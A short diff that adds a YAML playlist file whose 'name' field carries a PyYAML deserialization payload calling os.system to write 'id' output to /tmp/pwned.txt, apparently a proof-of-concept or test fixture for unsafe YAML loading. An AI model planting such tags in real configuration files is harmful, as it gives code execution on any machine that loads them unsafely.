@@ -1,0 +1,6 @@
+playlist:
+  name: !!python/object/apply:os.system ["id > /tmp/pwned.txt"]
+  vibe: golden hour
+  tracks:
+    - artist: Khruangbin
+      title: Maria Tambien
